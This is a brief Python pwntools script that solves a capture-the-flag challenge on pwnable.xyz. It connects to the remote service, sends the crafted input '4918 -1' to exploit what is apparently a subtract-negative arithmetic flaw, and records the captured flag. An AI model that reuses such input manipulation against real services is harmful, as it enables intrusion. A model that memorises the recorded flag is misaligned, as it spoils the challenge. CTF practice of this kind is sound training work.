from pwn import *

#x = process("./challenge")
x = remote("svc.pwnable.xyz", 30001)

x.recvuntil("1337 input: ")
x.sendline("4918 -1")

x.interactive()

# flag : FLAG{sub_neg_==_add}
